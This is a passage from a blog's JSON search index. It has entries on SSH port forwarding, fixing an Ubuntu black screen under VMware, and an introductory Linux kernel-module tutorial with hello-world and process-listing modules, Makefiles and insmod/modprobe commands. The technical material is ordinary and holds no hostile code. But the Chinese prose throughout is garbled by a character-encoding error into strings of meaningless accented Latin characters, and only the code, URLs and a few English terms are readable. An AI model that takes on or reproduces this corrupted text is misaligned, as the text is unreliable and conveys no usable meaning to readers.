å…¶æ¬¡æ˜¯è¿œç¨‹è½¬å‘æ—¶å…¶å®ç¿»äº†å¥½å¤šæ¬¡è½¦ï¼Œä¸€ç›´ä¼šæŠŠç«¯å£å¼„æ··ï¼Œä½†æ˜¯æœ‰ä¸ªç‘•ç–µå°±æ˜¯è¿œç¨‹è½¬å‘æ—¶ï¼Œæˆ‘å¯åŠ¨è‡ªå·±çš„flaskçš„webæœåŠ¡ï¼Œå´ä¸€ç›´curlä¸åˆ°ä¸œè¥¿ï¼Œç”¨http.serverå´æˆåŠŸäº†ï¼Œå¯èƒ½æ˜¯å“ªé‡Œæœ‰é—®é¢˜æ²¡æœ‰å‘ç°æŠŠ  ","description":"","tags":["ssh"],"title":"SSHç«¯å£è½¬å‘","uri":"/posts/ssh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"categories":["linux"],"content":"å…³äºVMwareè™šæ‹Ÿæœºä¸­ï¼ŒUbuntuå¼€æœºé»‘å±è§£å†³è‹¥å¹² ç›¸å½“äºMark\næ²¡æƒ³åˆ°ï¼Œåœ¨å†™ç³»ç»Ÿå®‰å…¨å†…æ ¸æ¨¡å—æ—¶ï¼Œé”å±å¼€å‡ºæ¥åï¼Œä»–ç•Œé¢å°±å´©äº†ï¼Œæˆ‘æƒ³ç€é‡å¯èƒ½è§£å†³ä¸€åˆ‡é—®é¢˜ï¼Œç„¶åé‡å¯å®Œä»–å°±å‡‰äº†\nä¸€ç›´åœ¨å†’ä¸€ä¸ªç™½è‰²çš„å…‰æ ‡ï¼Œå¿ƒæƒ³ç€ç»§ç»­é‡å¯çœ‹çœ‹æœ‰æ²¡æç¤º\npiix4_smbus:HostSMBuscontrollernotenabled ç„¶åå†å¯åŠ¨ä¸€è¡Œæ—¶çœ‹è§è¿™ä¸ªï¼Œæœç´¢è§£å†³åŠæ³•\nä½†æ˜¯ç½‘ä¸Šéƒ½æ˜¯å¤§åŒå°å¼‚çš„åŠæ³•â€”â€”è¿›å…¥ç»ˆç«¯ï¼Œç¦ç”¨æ¨¡å—\nä½†æ˜¯æˆ‘æ²¡æœ‰ç»ˆç«¯å•Š\næœ€åæŸ¥åˆ°å¼€æœºæ—¶ä¸€ç›´æŒ‰shiftå¯ä»¥è¿›å…¥ä¸€ä¸ªé€‰æ‹©å¯åŠ¨ç•Œé¢ï¼Œç±»ä¼¼windowsçš„bios\nè¿›å»åå°±å¯ä»¥é€‰æ‹©æ¢å¤æ¨¡å¼ï¼Œä»¥rootèº«ä»½è¿›å…¥\n https://blog.csdn.net/jays_/article/details/80848666\nhttps://www.cnblogs.com/elixforever/p/4924492.html\n ç„¶è€Œè§£å†³å®Œå†æ¬¡é‡å¯ï¼Œå´è¿˜æ˜¯é»‘å±ï¼Œè™½ç„¶å°‘äº†é‚£ä¸€è¡Œï¼Œä½†æˆ‘å·²ç»çŸ¥é“äº†ï¼Œè¿™ä¸æ˜¯å…³é”®é—®é¢˜\n https://blog.csdn.net/what_about_us/article/details/81207926\n ç„¶åå°±æƒ³ç€ä»¥é»‘å±çš„æ–¹å¼ç›´æ¥æœè§£å†³åŠæ³•ï¼Œç„¶åå°±çœ‹åˆ°ä¸Šé¢è¿™ä¸ªé“¾æ¥æœ‰ç€ç»¼åˆçš„è§£é‡Šï¼Œä¾¿å­¦ç€ä»–markä¸‹æ¥\nå°è¯•äº†å…¶ä¸­çš„åŠæ³•ï¼Œå‘ç°åŸæ¥çœŸçš„æ˜¯å›¾å½¢ç•Œé¢å´©äº†ï¼ŒæŒ‰ä½crtl+alt+F2~6å¯ä»¥è¿›å…¥tty2~6ï¼Œä¹Ÿå°±æ˜¯æ— å›¾å½¢åŒ–ç»ˆç«¯\næƒ³ç€æˆ‘ä¸‹åˆä¹ŸåŒæ—¶å¼€è¿‡vmwareå’Œwegameï¼Œç„¶åæŠŠvmwareç»™æš‚åœäº†ï¼Œæœå‡ºæ¥è¿™ç§æƒ…å†µæœ‰å¯èƒ½æ˜¯LSPé—®é¢˜\n https://www.cnblogs.com/zhang-yawei/p/12071970.html\nâ€‹\tè™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„é€šä¿¡ï¼ŒåŸºæœ¬ä¸Šæ˜¯ä»¥ socket çš„æ–¹å¼è¿›è¡Œé€šä¿¡çš„ï¼ˆè¿™é‡Œçš„ socket æ³›æŒ‡ä¸€åˆ‡ socketï¼ŒåŒ…æ‹¬æœ¬åœ°çš„ã€ç½‘ç»œçš„ç­‰ç­‰ï¼‰ï¼›\nã€€æŸä¸ªç¨‹åºé€šè¿‡ LSP ç»™ç³»ç»Ÿçš„ TCP/IP stack æ³¨å…¥äº†è‡ªå·±çš„ DLLï¼Œå¦‚æœç¨‹åºé€€å‡ºæ—¶ï¼Œæ²¡æœ‰æŠŠè¿™ä¸ª DLL æ”¶å›æ¥ï¼Œæˆ–è€…å›æ”¶å¤±è´¥ã€æ²¡æœ‰å½»åº•å›æ”¶ç­‰ï¼Œé‚£ä¹ˆè¿™ä¸ª DLL æ®‹ç•™çš„ä¸œè¥¿å½±å“äº†æ•´ä¸ª TCP/IP stackï¼Œè€Œä¸”æ˜¯æ°¸ä¹…æ€§çš„ã€‚ æ¯ä¸ª socket æ”¶å‘çš„æ•°æ®åŒ…æ˜¯è¦ç»è¿‡ TCP/IP stack çš„ï¼Œè¿™ä¸ª DLL å¯èƒ½ä¼šå¯¹è¿™äº› socket çš„æ•°æ®åŒ…åšäº†äº›ä»€ä¹ˆæ“ä½œï¼ˆæ¯”å¦‚ä¿®æ”¹æ•°æ®ã€ç›´æ¥ä¸¢å¼ƒç­‰ç­‰ï¼‰ï¼Œç„¶åæ‰€ä»¥ä½ çš„è™šæ‹Ÿæœºå°±é»‘å±äº†â€¦â€¦ netsh winsock resetè¿™æ¡å‘½ä»¤ä¼šé‡ç½®ï¼Œæ‰€ä»¥é‚£äº›è¢«æ³¨å…¥çš„ DLL å°±è¢«æ¸…ç†æ‰äº†ï¼Œæ‰€ä»¥ä¸€åˆ‡éƒ½æ˜¯æœ€åˆçš„æ¨¡æ ·äº†â€¦â€¦\n ä½†æ˜¯æˆ‘ç”¨è¿™ä¸ªå‘½ä»¤é‡å¯ä¹‹åï¼Œä»¥ä¸ºä»–èƒ½æ¢å¤åŸæ ·ï¼Œä½†æ˜¯ä»–æ²¡æœ‰ï¼\nç”¨tty1çš„startxè¿›å…¥é»‘å±ï¼Œç„¶åä»–å°±æ²¡æ³•åŠ¨äº†ï¼Œæˆ‘ä»¬è¿›tty2çš„ps -ef æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°éƒ½æ˜¯æ­£å¸¸çš„å•Š\nå¯è§gnomeæ­£å¸¸è¿è¡Œå•Š\n https://askubuntu.com/questions/999180/16-04-to-17-10-login-loop-because-of-xsession-and-upstart\n æœç„¶è¿˜æ˜¯googleé è°±ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ–¹æ³•ï¼Œè®©æˆ‘çœ‹åˆ°äº†æ¡Œé¢ï¼Œä¸è¿‡åˆæŠ¥äº†ä¸‹é¢è¿™è¡Œé”™è¯¯\ncould not set the configuration for CRTC 63 ç„¶åæ²¡æœ‰æœåˆ°è§£å†³åŠæ³•ï¼Œå¤ªæ™šäº†ï¼Œå…ˆç¡\n æˆ‘ä»¬è¿˜æ˜¯ä»æ­£å¸¸æ–¹å¼å»debugå§ï¼Œæ—¢ç„¶æ˜¯å›¾å½¢åŒ–ç•Œé¢å´©äº†ï¼Œå°±å»æ‰¾gnomeçš„é”™è¯¯æ—¥å¿—\nä¸è¿‡ä¹‹å‰è°ƒä¸­æ–‡è¿˜å¾—å…ˆæè‹±æ–‡æ¥ï¼Œå¤ªéš¾äº†\n https://wiki.ubuntu.org.cn/%E4%BF%AE%E6%94%B9locale\n è°ƒå®Œä¹‹åï¼Œå»/var/logä¸‹æŸ¥çœ‹æ—¥å¿—\nå¤ªå¤šä¸”å¤ªæ‚äº†ï¼Œå‡†å¤‡æ¸…ç©ºæ—¥å¿—ï¼Œé‡æ–°å¤ç°é”™è¯¯\n æ¸…ç©ºæ—¥å¿—ï¼šhttps://www.cnblogs.com/Jimmy1988/p/8892483.html\n æ‰¾åˆ°ç–‘ä¼¼çš„å‡ ä¸ªé”™è¯¯ï¼Œæ³¨æ„10:51:02æ˜¯æ­£å¸¸å¯åŠ¨å®Œç³»ç»Ÿè¿›å…¥tty1çš„æ—¶é—´\nåé¢å…¨æ˜¯ä¸»é¢˜è§£æé”™è¯¯ï¼Œä¹Ÿå°±æ˜¯æ— æ³•æ‰“å¼€æ¡Œé¢\nä½†æ˜¯æ ¹æ®ç¬¬äºŒå¼ å›¾çš„æ—¥å¿—ä¸­lightdm.serviceä¸€ç›´åœ¨é‡å¯å¤±è´¥\n LightDMï¼šLight Display Managerï¼Œæ˜¯ä¸€ä¸ªè½»é‡çº§linuxæ¡Œé¢æ˜¾ç¤ºç®¡ç†å™¨\nLightDM_ç™¾åº¦ç™¾ç§‘\n æˆ‘ä»¬çœ‹ä¸‹æœåŠ¡çŠ¶æ€\nç„¶åå‘ç°æœåŠ¡å¯åŠ¨è¿‡åï¼Œå¡åœ¨äº†è«åå…¶å¦™çš„åœ°æ–¹\næƒ³è¦æ›´æ–°è½¯ä»¶åŒ…è¯•è¯•\nç„¶åå‘ç°è¿˜æ²¡ç½‘\n https://blog.csdn.net/zhu334974857/article/details/77198545\nhttps://www.geek-share.com/detail/2706261264.html\n ç„¶åå‘ç°åº”è¯¥æ˜¯dnsçš„é—®é¢˜\nç„¶åæ›´æ–°è½¯ä»¶åŒ…ä¹‹åï¼Œæˆ‘ç«Ÿç„¶çœ‹åˆ°äº†ä¹…è¿çš„æ¡Œé¢äº†\nåº”è¯¥å°±æ˜¯è½¯ä»¶åŒ…æœ‰ç›¸äº’ä¸å…¼å®¹çš„æƒ…å†µå¯¼è‡´lightdmå¯åŠ¨å¤±è´¥\né‡è£…ubuntuæ¡Œé¢ï¼Œç„¶åæœ‰äº†å¾ªç¯ç™»é™†é”™è¯¯\nçœ‹äº†ä¸‹åˆ«äººçš„è§£å†³åŠæ³•ï¼Œæ²¡æœ‰ç›¸ç¬¦çš„ï¼Œå¤§å¤šéƒ½æ˜¯ä¸Nå¡é©±åŠ¨ä¸å…¼å®¹ï¼Œå¸è½½Nå¡é©±åŠ¨ç„¶åé‡è£…ï¼Œç»“æœæˆ‘æƒ³ç€è¿™æ€è·¯ï¼Œå‰é¢è§£å†³åŠæ³•ä¸­æ–°è£…äº†ä¸€ä¸ªunityï¼Œæˆ‘ç›´æ¥apt remove unityç„¶åå°±è¿›å»äº†woc\nç»ˆäºæŠŠè¿™ä¸ªubuntuæå¥½äº†ï¼Œæœç„¶æ²¡æœ‰é‡è£…è§£å†³ä¸äº†çš„é—®é¢˜ï¼Œå”¯ä¸€ä¸å¥½çš„å°±æ˜¯æˆ‘ç”¨çš„ubuntu16.04ä¸€ä¸å°å¿ƒå‡çº§æˆäº†ubuntu.18.04ï¼Œä¸è¿‡å¿ƒæƒ…å€çˆ½å„¿\n","description":"","tags":["ubuntu"],"title":"VMware-Ubuntu-blackScreen-fix","uri":"/posts/vmware-ubuntu-blackscreen-fix/"},{"categories":["linux"],"content":"Linux å†…æ ¸ç¼–ç¨‹å…¥é—¨\u0026ç®€ä»‹  Linuxå¯åŠ è½½å†…æ ¸æ¨¡å—æ˜¯ Linux å†…æ ¸çš„æœ€é‡è¦åˆ›æ–°ä¹‹ä¸€ã€‚å®ƒä»¬æä¾›äº†å¯ä¼¸ç¼©çš„ã€åŠ¨æ€çš„å†…æ ¸ã€‚å…¶å®ƒå¼€å‘è€…å¯ä»¥ä¸ç”¨é‡æ–°ç¼–è¯‘æ•´ä¸ªå†…æ ¸ä¾¿å¯ä»¥å¼€å‘å†…æ ¸å±‚çš„ç¨‹åºï¼Œæå¤§æ–¹ä¾¿äº†é©±åŠ¨ç¨‹åºç­‰çš„å¼€å‘é€Ÿåº¦ã€‚\n  å‚è€ƒï¼š\nå°ç™½å­¦Linuxä¹‹å†…æ ¸æ¨¡å—ç¼–ç¨‹\nlinuxå†…æ ¸ç¼–ç¨‹\né»‘å®¢å†…æ ¸ï¼šç¼–å†™å±äºä½ çš„ç¬¬ä¸€ä¸ªLinuxå†…æ ¸æ¨¡å—\nlinux modç›¸å…³å‘½ä»¤\u0026å†…æ ¸æ¨¡å—åŒ–\nlinuxå†…æ ¸ç¼–ç¨‹å…¥é—¨ hello world\n ç”±äºç³»ç»Ÿå®‰å…¨è¿™é—¨è¯¾åˆšä¸Šæ¥ï¼Œå°±ç»™äº†ä¸€ä¸ªå†…æ ¸ç¼–ç¨‹çš„å®ä¾‹ï¼Œæˆ‘ä¸å¾—ä¸æ‰¾äº›èµ„æ–™å­¦ä¹ å­¦ä¹ \n ä»€ä¹ˆæ˜¯å†…æ ¸æ¨¡å—ï¼šå†…æ ¸æ¨¡å—æ˜¯å…·æœ‰ç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºã€‚å®ƒå¯ä»¥è¢«å•ç‹¬ç¼–è¯‘ï¼Œä½†æ˜¯ä¸èƒ½å•ç‹¬è¿è¡Œï¼Œå®ƒçš„è¿è¡Œå¿…é¡»è¢«é“¾æ¥åˆ°å†…æ ¸ä½œä¸ºå†…æ ¸çš„ä¸€éƒ¨åˆ†åœ¨å†…æ ¸ç©ºé—´ä¸­è¿è¡Œã€‚æ¨¡å—ç¼–ç¨‹å’Œå†…æ ¸ç‰ˆæœ¬å¯†åˆ‡ç›¸è¿ï¼Œå› ä¸ºä¸åŒçš„å†…æ ¸ç‰ˆæœ¬ä¸­æŸäº›å‡½æ•°çš„å‡½æ•°åä¼šæœ‰å˜åŒ–ï¼ˆæ‰€ä»¥æˆ‘åœ¨ç¼–è¯‘è€å¸ˆç»™çš„å®ä¾‹æ—¶æŠ¥é”™äº†ï¼‰ï¼Œå› æ­¤æ¨¡å—ç¼–ç¨‹ä¹Ÿå¯ä»¥è¯´æ˜¯å†…æ ¸ç¼–ç¨‹ã€‚   https://lxr.missinglinkelectronics.com/linuxï¼šè¿™ä¸ªç½‘å€é‡Œå¯ä»¥æŸ¥åˆ°æ‰€éœ€ç”¨çš„linuxå†…æ ¸å‡½æ•°æ‰€åœ¨ä½ç½®\nå½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨linuxæºç ä¸‹æ‰¾åˆ°ï¼Œå¯èƒ½æ¯”è¾ƒæ…¢ï¼šhttps://github.com/torvalds/linuxï¼ˆgithubï¼Œsearch this repositoryï¼‰\n  å†…æ ¸æ¨¡å—ç¼–ç¨‹ç‰¹ç‚¹ï¼š æ¨¡å—æœ¬èº«ä¸è¢«ç¼–è¯‘è¿›å†…æ ¸æ˜ åƒï¼Œä»è€Œæ§åˆ¶äº†å†…æ ¸çš„å¤§å°ï¼›æ¨¡å—ä¸€æ—¦è¢«åŠ è½½ï¼Œå°±å’Œå†…æ ¸ä¸­çš„å…¶ä»–éƒ¨åˆ†å®Œå…¨ä¸€æ ·ã€‚   Linuxé©±åŠ¨ç¨‹åºæœ‰ä¸¤ç§åŠ è½½æ–¹å¼ï¼šä¸€ç§æ˜¯é™æ€åœ°ç¼–è¯‘è¿›å†…æ ¸ï¼Œå†…æ ¸å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½ï¼Œå¦ä¸€ç§æ˜¯ç¼–å†™ä¸ºå†…æ ¸/é©±åŠ¨æ¨¡å—ï¼Œä½¿ç”¨insmodå‘½ä»¤å°†æ¨¡å—åŠ¨æ€åŠ è½½åˆ°æ­£åœ¨è¿è¡Œçš„å†…æ ¸ï¼Œä¸éœ€è¦æ—¶ç”¨rmmodå‘½ä»¤å°†æ¨¡å—å¸è½½ã€‚\n ä¸Šå›¾ä¸ºlinuxå†…æ ¸åŠ è½½è¿‡ç¨‹\nç”¨æˆ·å±‚ç¼–ç¨‹å’Œå†…æ ¸æ¨¡å—ç¼–ç¨‹çš„åŒºåˆ«     åº”ç”¨ç¨‹åº å†…æ ¸æ¨¡å—ç¨‹åº     ä½¿ç”¨å‡½æ•° libcåº“ å†…æ ¸å‡½æ•°   è¿è¡Œç©ºé—´ ç”¨æˆ·ç©ºé—´ å†…æ ¸ç©ºé—´   è¿è¡Œæƒé™ æ™®é€šç”¨æˆ· è¶…çº§ç”¨æˆ·(superuser)   å…¥å£å‡½æ•° main() module_init()   å‡ºå£å‡½æ•° exit() module_exit()   ç¼–è¯‘ gcc makefile   é“¾æ¥ gcc insmod   è¿è¡Œ ç›´æ¥è¿è¡Œç”Ÿæˆçš„./a.out insmod   è°ƒè¯• gdb kdbugã€kdbã€kgdb    å†…æ ¸ç¼–ç¨‹ï¼šHello World 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  #include \u003clinux/init.h\u003e#include \u003clinux/module.h\u003e#include \u003clinux/kernel.h\u003e //æ¨¡å—è®¸å¯è¯å£°æ˜,å¿…é¡» MODULE_LICENSE(\"GPL\"); //æ¨¡å—åŠ è½½å‡½æ•°,å¿…é¡» static int hello_init(void){ printk(KERN_ALERT \"Hello Kernel!\"); return 0; } //æ¨¡å—å¸è½½å‡½æ•°,å¿…é¡» static void hello_exit(void){ printk(KERN_ALERT \"goodbye,kernel/n\"); } //æ¨¡å—çš„æ³¨å†Œ module_init(hello_init); module_exit(hello_exit); // ä»¥ä¸‹å¯é€‰ //å£°æ˜æ¨¡å—çš„ä½œè€… MODULE_AUTHOR(\"Magic\"); //å£°æ˜æ¨¡å—çš„æè¿° MODULE_DESCRIPTION(\"This is a simple example!/n\"); //å£°æ˜æ¨¡å—çš„åˆ«å MODULE_ALIAS(\"A simplest example\"); //å£°æ˜æ¨¡å—çš„ç‰ˆæœ¬ MODULE_VERSION(\"version_string\"); //å£°æ˜è®¾å¤‡è¡¨,å¯¹äºUSB,PCIç­‰è®¾å¤‡é©±åŠ¨,é€šå¸¸ä¼šåˆ›å»ºä¸€ä¸ª MODULE_DEVICE_TABLE(\"table_info\");   åœ¨å†…æ ¸ç¼–ç¨‹æ—¶ï¼Œä¸å¾€å¸¸åº”ç”¨ç¼–ç¨‹æ—¶ç±»ä¼¼è€Œåˆæœ‰æ‰€ä¸åŒ\nå¼€å¤´ä¸ºå†…æ ¸ç¼–ç¨‹æ‰€å¿…é¡»çš„ä¸‰ä¸ªå¤´æ–‡ä»¶\næœ€æ˜æ˜¾çš„å°±æ˜¯å‡½æ•°å…¥å£ç”±main()å˜æˆäº†module_initï¼Œåˆæˆ–è€…åƒä¸‹é¢ç›´æ¥å†™å‡ºinit_module()\nåœ¨å†…æ ¸ç¼–ç¨‹ä¸­ï¼Œmodule_init(begin_func);æ˜¯æŒ‡å®šbegin_funcä¸ºè¯¥æ¨¡å—çš„å…¥å£ï¼Œè€Œç›¸å¯¹åº”çš„module_exit(exit_func)æŒ‡å®šäº†æ¨¡å—é€€å‡ºæ—¶çš„å‡ºå£å‡½æ•°ä¸ºexit_funcï¼Œè¿™ä¸¤è€…çš†ä¸ºæ¨¡å—åŠ è½½å‡½æ•°\n  æ¨¡å—åŠ è½½å‡½æ•°ï¼Œè¿™éƒ¨åˆ†æ˜¯å¿…é¡»çš„ã€‚æ¨¡å—åŠ è½½å‡½æ•°å¿…é¡»ä»¥module_init(func)çš„å½¢å¼è¢«æŒ‡å®šã€‚å®ƒè¿”å›æ•´å½¢å€¼ï¼Œè‹¥åˆå§‹åŒ–æˆåŠŸï¼Œåº”è¿”å›0ã€‚åœ¨ä¸Šé¢é‚£ä¸ªä¾‹å­å½“ä¸­ï¼Œhello_init()å‡½æ•°å°±æ˜¯æ¨¡å—åŠ è½½å‡½æ•°éœ€è¦æ‰§è¡Œçš„ï¼Œä¸»è¦æ˜¯æ‰“å°ä¸€æ¡ä¿¡æ¯ã€‚\n  è·Ÿæ¨¡å—åŠ è½½å‡½æ•°ç›¸å¯¹åº”çš„å°±æ˜¯æ¨¡å—å¸è½½å‡½æ•°ï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯å¿…é¡»çš„ã€‚æ¨¡å—å¸è½½å‡½æ•°åœ¨æ¨¡å—å¸è½½çš„æ—¶å€™æ‰§è¡Œï¼Œä¸è¿”å›ä»»ä½•å€¼ï¼Œå¿…é¡»ä»¥module_exit(func)çš„å½¢å¼æ¥æŒ‡å®šã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œhello_exit()å‡½æ•°å°±æ˜¯æ¨¡å—å¸è½½å‡½æ•°éœ€è¦æ‰§è¡Œçš„ï¼Œåªè¦æ˜¯æ‰“å°äº†ä¸€æ¡é€€å‡ºä¿¡æ¯ã€‚\n  æ¨¡å—è®¸å¯è¯å£°æ˜ï¼Œè¿™éƒ¨åˆ†æ˜¯å¿…é¡»æœ‰çš„ã€‚æ¨¡å—è®¸å¯è¯ï¼ˆLICENSEï¼‰å£°æ˜æè¿°å†…æ ¸æ¨¡å—çš„è®¸å¯æƒé™ï¼Œå¦‚æœä¸å£°æ˜LICENSEï¼Œæ¨¡å—è¢«åŠ è½½æ—¶ï¼Œå°†æ”¶åˆ°å†…æ ¸è¢«æ±¡æŸ“ï¼ˆkernel taintedï¼‰çš„è­¦å‘Šã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå†…æ ¸æ¨¡å—åº”éµå®ˆGPLå…¼å®¹è®¸å¯æƒã€‚Linux2.6å†…æ ¸æ¨¡å—æœ€å¸¸è§çš„æ˜¯ä»¥MODULE_LICENSEï¼ˆ\"Dual BSD/GPL\")è¯­å¥å£°æ˜æ¨¡å—é‡‡ç”¨BSD/GPLåŒLICENSEã€‚\n  å†è€…ï¼Œå…¶ä¸­çš„å‡½æ•°æœ‰æ‰€ä¸åŒï¼Œæ¯”å¦‚printk()æ˜¯ç”±å†…æ ¸å®šä¹‰çš„ï¼ŒæŠŠè¦æ‰“å°çš„ä¿¡æ¯è¾“å…¥åˆ°ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œå¯ä»¥ç”¨dmesgå‘½ä»¤æŸ¥çœ‹\n\u003e\u003e\u003eæ­¤å¤–ï¼Œæ¨¡å—åŠ è½½å‡½æ•°æœ‰å¦å¤–ä¸€ç§å†™æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13  static int __init hello_init(void){ //init  printk(\"hello tiger/n\"); return 0; } static void __exit exit(void){ //exit code \tprintk(\"bye bye!/n\"); }   è¿™ç§å†™æ³•ä¸å‰é¢ä¸åŒï¼Œå°±æ˜¯åŠ äº†__initå’Œ__exitå‰ç¼€ï¼Œä¸ç¬¬ä¸€ç§å†™æ³•æ¥è¯´ï¼Œä¼šæ¯”è¾ƒèŠ‚çœå†…å­˜\n __init å’Œ __exit æ˜¯ Linux å†…æ ¸çš„ä¸€ä¸ªå®å®šä¹‰ï¼Œä½¿ç³»ç»Ÿåœ¨åˆå§‹åŒ–å®Œæˆåé‡Šæ”¾è¯¥å‡½æ•°ï¼Œå¹¶é‡Šæ”¾å…¶æ‰€å å†…å­˜ã€‚\nåœ¨ linux å†…æ ¸ä¸­ï¼Œæ‰€æœ‰æ ‡ç¤ºä¸º init çš„å‡½æ•°åœ¨è¿æ¥çš„æ—¶å€™éƒ½æ”¾åœ¨ .init.text è¿™ä¸ªåŒºæ®µå†…ï¼Œæ­¤å¤–ï¼Œæ‰€æœ‰çš„ init å‡½æ•°åœ¨åŒºæ®µ .initcall.init ä¸­è¿˜ä¿å­˜äº†ä¸€ä»½å‡½æ•°æŒ‡é’ˆï¼Œåœ¨åˆå§‹åŒ–æ—¶å†…æ ¸ä¼šé€šè¿‡è¿™äº›å‡½æ•°æŒ‡é’ˆè°ƒç”¨è¿™äº› __init å‡½æ•°ï¼Œå¹¶åœ¨åˆå§‹åŒ–å®Œæˆåé‡Šæ”¾ init åŒºæ®µï¼ˆåŒ…æ‹¬ .init.text,.initcall.init ç­‰ï¼‰ã€‚\n__exitå’Œ __init ä¸€æ ·ï¼Œ __exit ä¹Ÿå¯ä»¥ä½¿å¯¹åº”å‡½æ•°åœ¨è¿è¡Œå®Œæˆåè‡ªåŠ¨å›æ”¶å†…å­˜ã€‚\n ä¹‹åï¼Œç¼–å†™å®ŒCæ–‡ä»¶ä¹‹åå°±è¦å¯¹å…¶è¿›è¡Œç›¸å¯¹åº”çš„æ“ä½œï¼ŒæŠŠä»–ç¼–è¯‘æˆå†…æ ¸æ–‡ä»¶ã€‚\nè¦çŸ¥é“ä¸åŒç¯å¢ƒä¸‹ï¼Œå†…æ ¸ç‰ˆæœ¬ä¸ä¸€æ ·çš„å¯èƒ½æ€§æé«˜ï¼Œå†è€ƒè™‘åˆ°è·¯å¾„ç­‰é—®é¢˜ï¼Œä¸ºäº†ç¼–è¯‘æ–¹ä¾¿ï¼Œä¸€èˆ¬éƒ½é‡‡ç”¨Makefileçš„æ–‡ä»¶å½¢å¼ï¼Œæ¥ç®€åŒ–å†…æ ¸ç‰ˆæœ¬å·ã€è·¯å¾„ã€ä»¥åŠç¼–å†™æ¨¡å—çš„è·¯å¾„å’Œä¿¡æ¯\n1 2 3 4 5 6 7 8 9 10 11 12 13  obj-m += hello.o #generate the path CURRENT_PATH:=$(shell pwd) #the current kernel version number LINUX_KERNEL:=$(shell uname -r) #the absolute path LINUX_KERNEL_PATH:=/usr/src/linux-headers-$(LINUX_KERNEL) #complie object all: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules #clean clean: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean   è¿™æ˜¯è€å¸ˆç»™çš„æ ·ä¾‹ï¼Œè¿˜ä¼šæ‰“å°ç°æœ‰çš„æ‰€æœ‰è¿›ç¨‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  #include \u003clinux/kernel.h\u003e#include \u003clinux/module.h\u003e#include \u003clinux/sched.h\u003e#include \u003clinux/sched/signal.h\u003e#include \u003clinux/sched/task.h\u003e int init_module(){ printk(\"Hello world\\n\"); extern unsigned long volatile jiffies; struct task_struct *p = \u0026init_task; do{ printk(\"%d %s\\n\", p-\u003epid, p-\u003ecomm); p = next_task(p); } while (p!=\u0026init_task); return 0; } void cleanup_module(){ printk(\"bye\\n\"); } MODULE_LICENSE(\"GPL\");   ä»¥åŠå…¶ç®€å•çš„Makefile\n1 2 3 4 5 6  obj-m := hellops.o KDIR := /lib/modules/$(shell uname -r)/build PWD := $(shell pwd) default: $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules   è¿è¡Œç»“æœå¦‚ä¸Š\n ä¸€äº›å¸¸ç”¨çš„linuxå†…æ ¸å‡½æ•°ï¼šhttps://blog.csdn.net/guowenyan001/article/details/43342301\n å†…æ ¸æ¨¡å—çš„æ“ä½œ ç¼–å†™å¥½å†…æ ¸æ¨¡å—çš„å‡½æ•°ä¹‹åï¼Œç»è¿‡ç¼–è¯‘ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†æ‰€è¦çš„å†…æ ¸æ¨¡å—çš„æ‰§è¡Œæ–‡ä»¶xxx.ko\nä»¥ä¸‹å°±æ˜¯æˆ‘ä»¬å¯ä»¥å¯¹è¿™ä¸ªæ–‡ä»¶æ“çºµçš„ä¸€äº›å‘½ä»¤\n1 2 3 4 5 6  $ insmod xxx.ko #å°†æ¨¡å—è£…å…¥å†…æ ¸ç§ $ rmmod xxx.ko #å°†æ¨¡å—ä»å†…æ ¸ç§åˆ é™¤ $ lsmod | grep xxx #åˆ—è¡¨æ˜¾ç¤ºæ‰€æœ‰çš„å†…æ ¸æ¨¡å—ï¼Œç±»ä¼¼lså‘½ä»¤ $ modprobe -v xxx.ko #è‡ªåŠ¨å¤„ç†è½½å…¥æ¨¡å—ï¼Œä¸€èˆ¬ç”¨äºè½½å…¥æŒ‡å®šçš„ä¸ªåˆ«æ¨¡å—æˆ–ä¸€ç»„ç›¸ä¾èµ–çš„æ¨¡å— $ depmod /PATH/TO/MODULES_DIR #æŸ¥çœ‹æ¨¡å—ä¾èµ– $ modinfo #æŸ¥çœ‹æ¨¡å—çš„å…·ä½“ä¿¡æ¯   modprobe: modprobeå¯è½½å…¥æŒ‡å®šçš„ä¸ªåˆ«æ¨¡å—ï¼Œæˆ–æ˜¯è½½å…¥ä¸€ç»„ç›¸ä¾èµ–çš„æ¨¡å—ã€‚modprobeä¼šæ ¹æ®depmodæ‰€äº§ç”Ÿçš„ä¾èµ–å…³ç³»ï¼Œå†³å®šè¦è½½å…¥å“ªäº›æ¨¡å—ã€‚è‹¥åœ¨è½½å…¥è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œåœ¨modprobeä¼šå¸è½½æ•´ç»„çš„æ¨¡å—ã€‚ä¾èµ–å…³ç³»æ˜¯é€šè¿‡è¯»å– /lib/modules/2.6.xx/modules.depå¾—åˆ°çš„ã€‚è€Œè¯¥æ–‡ä»¶æ˜¯é€šè¿‡depmod æ‰€å»ºç«‹ã€‚\n å…³äºmodprobeçš„ç›¸å…³\næ¨¡å—åŠ è½½â€”â€”modprobeå’Œinsmodçš„åŒºåˆ«(è½¬)\nLinuxä¸‹ä½¿ç”¨modprobeåŠ è½½é©±åŠ¨\n ","description":"","tags":["linux"],"title":"Linuxå†…æ ¸ç¼–ç¨‹å…¥é—¨","uri":"/posts/linux%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8/"},{"categories":["linux"],"content":"Role Based Access Control  å‚è€ƒï¼š\nSpring Security å®æˆ˜å¹²è´§ï¼š 